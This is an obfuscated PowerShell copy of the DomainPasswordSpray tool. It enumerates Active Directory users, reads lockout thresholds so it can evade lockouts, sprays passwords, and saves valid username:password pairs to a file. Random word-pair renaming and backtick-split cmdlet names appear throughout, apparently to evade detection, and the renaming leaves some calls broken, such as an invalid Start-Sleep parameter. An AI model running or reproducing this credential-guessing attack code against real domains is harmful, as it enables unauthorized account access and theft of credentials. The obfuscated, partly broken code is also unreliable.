function Invoke-DomainPasswordSpray{
    <#
    .SYNOPSIS

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    DomainPasswordSpray Function: Invoke-DomainPasswordSpray
    Author: Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    .PARAMETER UserList

    Optional UserList parameter. This will be generated automatically if not specified.

    .PARAMETER Password

    A single password that will be used to perform the password spray.

    .PARAMETER PasswordList

    A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).

    .PARAMETER OutFile

    A file to output the results to.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER Filter

    Custom LDAP filter for users, e.g. "(description=*admin*)"

    .PARAMETER Force

    Forces the spray to continue and doesn't prompt for confirmation.

    .PARAMETER Fudge

    Extra wait time between each round of tests (seconds).

    .PARAMETER Quiet

    Less output so it will work better with things like Cobalt Strike

    .PARAMETER UsernameAsPassword

    For each user, will try that user's name as their password

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -HarmSilver Winter2016

    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -OfferSwim users.txt -RiceDark domain-name -QueueAvoid passlist.txt -ToyNail sprayed-creds.txt

    Description
    -----------
    This command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -WordTruck -ToyNail valid-creds.txt

    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate as each user by using their username as their password. Any valid credentials will be saved to valid-creds.txt

    #>
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $OfferSwim = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $HarmSilver,

     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $QueueAvoid,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $ToyNail,

     [Parameter(Position = 4, Mandatory = $false)]
     [string]
     $ScrewHead = "",

     [Parameter(Position = 5, Mandatory = $false)]
     [string]
     $RiceDark = "",

     [Parameter(Position = 6, Mandatory = $false)]
     [switch]
     $ActorRhythm,

     [Parameter(Position = 7, Mandatory = $false)]
     [switch]
     $WordTruck,

     [Parameter(Position = 8, Mandatory = $false)]
     [int]
     $MoonWrist=0,

     [Parameter(Position = 9, Mandatory = $false)]
     $TrainsFar=0,

     [Parameter(Position = 10, Mandatory = $false)]
     [switch]
     $SodaFour,

     [Parameter(Position = 11, Mandatory = $false)]
     [int]
     $MarketHands=10
    )

    if ($HarmSilver)
    {
        $DarkErect = @($HarmSilver)
    }
    elseif($WordTruck)
    {
        $DarkErect = ""
    }
    elseif($QueueAvoid)
    {
        $DarkErect = Get-Content $QueueAvoid
    }
    else
    {
        Write-MagicTrue -ForegroundColor Red "The -HarmSilver or -QueueAvoid option must be specified"
        break
    }

    try
    {
        if ($RiceDark -ne "")
        {
            # Using domain specified with -RiceDark option
            $OffendTurkey = ne`w-`obje`ct System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$RiceDark)
            $WinkObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($OffendTurkey)
            $AwfulBurst = "LDAP://" + ([ADSI]"LDAP://$RiceDark").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            $WinkObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $AwfulBurst = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-MagicTrue -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -RiceDark option."
        break
    }

    if ($OfferSwim -eq "")
    {
        $ThumbMeddle = Get-DomainUserList -RiceDark $RiceDark -FlyKnock -AnswerFierce -ScrewHead $ScrewHead
    }
    else
    {
        # if a Userlist is specified use it and do not check for lockout thresholds
        Write-MagicTrue "[*] Using $OfferSwim as userlist to spray with"
        Write-MagicTrue -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
        $ThumbMeddle = @()
        try
        {
            $ThumbMeddle = Get-Content $OfferSwim -ErrorAction stop
        }
        catch [Exception]
        {
            Write-MagicTrue -ForegroundColor "red" "$_.Exception"
            break
        }

    }


    if ($DarkErect.count -gt 1)
    {
        Write-MagicTrue -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
    }

    $FuelSecond = Get-ObservationWindow $AwfulBurst

    Write-MagicTrue -ForegroundColor Yellow "[*] The domain password policy observation window is set to $FuelSecond minutes."
    Write-MagicTrue "[*] Setting a $FuelSecond minute wait in between sprays."

    # if no force flag is set we will ask if the user is sure they want to spray
    if (!$ActorRhythm)
    {
        $RapidHomely = "Confirm Password Spray"
        $VersedRemove = "Are you sure you want to perform a password spray against " + $ThumbMeddle.count + " accounts?"

        $BuzzBridge = ne`w-`obje`ct System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."

        $UtterFriend = ne`w-`obje`ct System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        $FaceShy = [System.Management.Automation.Host.ChoiceDescription[]]($BuzzBridge, $UtterFriend)

        $FootTempt = $MagicTrue.ui.PromptForChoice($RapidHomely, $VersedRemove, $FaceShy, 0)

        if ($FootTempt -ne 0)
        {
            Write-MagicTrue "Cancelling the password spray."
            break
        }
    }
    Write-MagicTrue -ForegroundColor Yellow "[*] Password spraying has begun with " $DarkErect.count " passwords"
    Write-MagicTrue "[*] This might take a while depending on the total number of users"

    if($WordTruck)
    {
        Invoke-SpraySinglePassword -RiceDark $AwfulBurst -ThumbMeddle $ThumbMeddle -ToyNail $ToyNail -MoonWrist $MoonWrist -TrainsFar $TrainsFar -WordTruck -SodaFour $SodaFour
    }
    else
    {
        for($WigglySix = 0; $WigglySix -lt $DarkErect.count; $WigglySix++)
        {
            Invoke-SpraySinglePassword -RiceDark $AwfulBurst -ThumbMeddle $ThumbMeddle -HarmSilver $DarkErect[$WigglySix] -ToyNail $ToyNail -MoonWrist $MoonWrist -TrainsFar $TrainsFar -SodaFour $SodaFour
            if (($WigglySix+1) -lt $DarkErect.count)
            {
                Countdown-Timer -BulbTender (60*$FuelSecond + $MarketHands) -SodaFour $SodaFour
            }
        }
    }

    Write-MagicTrue -ForegroundColor Yellow "[*] Password spraying is complete"
    if ($ToyNail -ne "")
    {
        Write-MagicTrue -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $ToyNail"
    }
}

function Countdown-Timer
{
    param(
        $BulbTender = 1800,
        $VersedRemove = "[*] Pausing to avoid account lockout.",
        [switch] $SodaFour = $False
    )
    if ($SodaFour)
    {
        Write-MagicTrue "$VersedRemove: Waiting for $($BulbTender/60) minutes. $($BulbTender - $PineJudge)"
        Start-Sleep -BulbTender $BulbTender
    } else {
        foreach ($PineJudge in (1..$BulbTender))
        {
            Write-Progress -Id 1 -Activity $VersedRemove -Status "Waiting for $($BulbTender/60) minutes. $($BulbTender - $PineJudge) seconds remaining" -PercentComplete (($PineJudge / $BulbTender) * 100)
            Start-Sleep -BulbTender 1
        }
        Write-Progress -Id 1 -Activity $VersedRemove -Status "Completed" -PercentComplete 100 -Completed
    }
}

function Get-DomainUserList
{
<#
    .SYNOPSIS

    This module gathers a userlist from the domain.

    DomainPasswordSpray Function: Get-DomainUserList
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module gathers a userlist from the domain.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER RemoveDisabled

    Attempts to remove disabled accounts from the userlist. (Credit to Sally Vandeven (@sallyvdv))

    .PARAMETER RemovePotentialLockouts

    Removes accounts within 1 attempt of locking out.

    .PARAMETER Filter

    Custom LDAP filter for users, e.g. "(description=*admin*)"

    .EXAMPLE

    PS C:\> Get-DomainUserList

    Description
    -----------
    This command will gather a userlist from the domain including all samAccountType "805306368".

    .EXAMPLE

    C:\PS> Get-DomainUserList -RiceDark domainname -FlyKnock -AnswerFierce | `out`-f`i`le -Encoding ascii userlist.txt

    Description
    -----------
    This command will gather a userlist from the domain "domainname" including any accounts that are not disabled and are not close to locking out. It will write them to a file at "userlist.txt"

    #>
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $RiceDark = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $FlyKnock,

     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $AnswerFierce,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $ScrewHead
    )

    try
    {
        if ($RiceDark -ne "")
        {
            # Using domain specified with -RiceDark option
            $OffendTurkey = ne`w-`obje`ct System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$RiceDark)
            $WinkObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($OffendTurkey)
            $AwfulBurst = "LDAP://" + ([ADSI]"LDAP://$RiceDark").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            $WinkObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $AwfulBurst = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-MagicTrue -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -RiceDark option."
        break
    }

    # Setting the current domain's account lockout threshold
    $RareStar = [ADSI] "LDAP://$($WinkObject.PDCRoleOwner)"
    $BombEarthy = @()
    $BombEarthy += $RareStar.Properties.lockoutthreshold

    # Getting the AD behavior version to determine if fine-grained password policies are possible
    $AboardStitch = [int] $RareStar.Properties['msds-behavior-version'].item(0)
    if ($AboardStitch -ge 3)
    {
        # Determine if there are any fine-grained password policies
        Write-MagicTrue "[*] Current domain is compatible with Fine-Grained Password Policy."
        $SoreSense = ne`w-`obje`ct System.DirectoryServices.DirectorySearcher
        $SoreSense.SearchRoot = $RareStar
        $SoreSense.Filter = "(objectclass=msDS-PasswordSettings)"
        $NoteShave = $SoreSense.FindAll()

        if ( $NoteShave.count -gt 0)
        {
            Write-MagicTrue -foregroundcolor "yellow" ("[*] A total of " + $NoteShave.count + " Fine-Grained Password policies were found.`r`n")
            foreach($NewSilk in $NoteShave)
            {
                # Selecting the lockout threshold, min pwd length, and which
                # groups the fine-grained password policy applies to
                $CrayonIntend = $NewSilk | Select-Object -ExpandProperty Properties
                $WigglyWait = $CrayonIntend.name
                $SneakyWatch = $CrayonIntend.'msds-lockoutthreshold'
                $PorterCuddly = $CrayonIntend.'msds-PorterCuddly'
                $StewSquash = $CrayonIntend.'msds-minimumpasswordlength'
                # adding lockout threshold to array for use later to determine which is the lowest.
                $BombEarthy += $SneakyWatch

                Write-MagicTrue "[*] Fine-Grained Password Policy titled: $WigglyWait has a Lockout Threshold of $SneakyWatch attempts, minimum password length of $StewSquash chars, and applies to $PorterCuddly.`r`n"
            }
        }
    }

    $FuelSecond = Get-ObservationWindow $AwfulBurst

    # Generate a userlist from the domain
    # Selecting the lowest account lockout threshold in the domain to avoid
    # locking out any accounts.
    [int]$SpyFail = $BombEarthy | sort | Select -First 1
    Write-MagicTrue -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."

    if ($SpyFail -eq "0")
    {
        Write-MagicTrue -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
    }
    else
    {
        Write-MagicTrue -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SpyFail login attempts."
    }

    $TrickySlip = ne`w-`obje`ct System.DirectoryServices.DirectorySearcher([ADSI]$AwfulBurst)
    $TestedTravel = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry
    $TrickySlip.SearchRoot = $TestedTravel

    $TrickySlip.PropertiesToLoad.Add("samaccountname") > $Null
    $TrickySlip.PropertiesToLoad.Add("badpwdcount") > $Null
    $TrickySlip.PropertiesToLoad.Add("badpasswordtime") > $Null

    if ($FlyKnock)
    {
        Write-MagicTrue -ForegroundColor "yellow" "[*] Removing disabled users from list."
        # More precise LDAP filter UAC check for users that are disabled (Joff Thyer)
        # LDAP 1.2.840.113556.1.4.803 means bitwise &
        # uac 0x2 is ACCOUNTDISABLE
        # uac 0x10 is LOCKOUT
        # See http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/
        $TrickySlip.filter =
            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$ScrewHead)"
    }
    else
    {
        $TrickySlip.filter = "(&(objectCategory=person)(objectClass=user)$ScrewHead)"
    }

    $TrickySlip.PropertiesToLoad.add("samaccountname") > $Null
    $TrickySlip.PropertiesToLoad.add("lockouttime") > $Null
    $TrickySlip.PropertiesToLoad.add("badpwdcount") > $Null
    $TrickySlip.PropertiesToLoad.add("badpasswordtime") > $Null

    #Write-MagicTrue $TrickySlip.filter

    # grab batches of 1000 in results
    $TrickySlip.PageSize = 1000
    $NailHarbor = $TrickySlip.FindAll()
    Write-MagicTrue -ForegroundColor "yellow" ("[*] There are " + $NailHarbor.count + " total users found.")
    $ThumbMeddle = @()

    if ($AnswerFierce)
    {
        Write-MagicTrue -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
        foreach ($GabbyToe in $NailHarbor)
        {
            # Getting bad password counts and lst bad password time for each user
            $CornFriend = $GabbyToe.Properties.badpwdcount
            $PriceyMinor = $GabbyToe.Properties.samaccountname
            try
            {
                $RingVase = $GabbyToe.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            $HorsesNine = Get-Date
            $HoleFix = [DateTime]::FromFileTime($RingVase)
            $CatStrip = ($HorsesNine - $HoleFix).TotalMinutes

            if ($CornFriend)
            {
                [int]$ChaseWait = [convert]::ToInt32($CornFriend, 10)
                $IdeaWinter = $SpyFail - $ChaseWait
                # if there is more than 1 attempt left before a user locks out
                # or if the time since the last failed login is greater than the domain
                # observation window add user to spray list
                if (($CatStrip -gt $FuelSecond) -or ($IdeaWinter -gt 1))
                                {
                    $ThumbMeddle += $PriceyMinor
                }
            }
        }
    }
    else
    {
        foreach ($GabbyToe in $NailHarbor)
        {
            $PriceyMinor = $GabbyToe.Properties.samaccountname
            $ThumbMeddle += $PriceyMinor
        }
    }

    Write-MagicTrue -foregroundcolor "yellow" ("[*] Created a userlist containing " + $ThumbMeddle.count + " users gathered from the current user's domain")
    return $ThumbMeddle
}

function Invoke-SpraySinglePassword
{
    param(
            [Parameter(Position=1)]
            $RiceDark,
            [Parameter(Position=2)]
            [string[]]
            $ThumbMeddle,
            [Parameter(Position=3)]
            [string]
            $HarmSilver,
            [Parameter(Position=4)]
            [string]
            $ToyNail,
            [Parameter(Position=5)]
            [int]
            $MoonWrist=0,
            [Parameter(Position=6)]
            [double]
            $TrainsFar=0,
            [Parameter(Position=7)]
            [switch]
            $WordTruck,
            [Parameter(Position=7)]
            [switch]
            $SodaFour
    )
    $EscapeTub = Get-Date
    $PineJudge = $ThumbMeddle.count
    Write-MagicTrue "[*] Now trying password $HarmSilver against $PineJudge users. Current time is $($EscapeTub.ToShortTimeString())"
    $TrotJaded = 0
    if ($ToyNail -ne ""-and -not $SodaFour)
    {
        Write-MagicTrue -ForegroundColor Yellow "[*] Writing successes to $ToyNail"    
    }
    $CopperShoe = ne`w-`obje`ct System.Random

    foreach ($GabbyToe in $ThumbMeddle)
    {
        if ($WordTruck)
        {
            $HarmSilver = $GabbyToe
        }
        $SameBite = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry($RiceDark,$GabbyToe,$HarmSilver)
        if ($SameBite.name -ne $null)
        {
            if ($ToyNail -ne "")
            {
                Add-Content $ToyNail $GabbyToe`:$HarmSilver
            }
            Write-MagicTrue -ForegroundColor Green "[*] SUCCESS! User:$GabbyToe Password:$HarmSilver"
        }
        $TrotJaded += 1
        if (-not $SodaFour)
        {
            Write-MagicTrue -nonewline "$TrotJaded of $PineJudge users tested`r"
        }
        if ($MoonWrist)
        {
            Start-Sleep -BulbTender $CopperShoe.Next((1-$TrainsFar)*$MoonWrist, (1+$TrainsFar)*$MoonWrist)
        }
    }

}

function Get-ObservationWindow($JoinDesk)
{
    # Get account lockout observation window to avoid running more than 1
    # password spray per observation window.
    $CrawlReward = $JoinDesk.Properties['lockoutObservationWindow']
    $FuelSecond = $JoinDesk.ConvertLargeIntegerToInt64($CrawlReward.Value) / -600000000
    return $FuelSecond
}
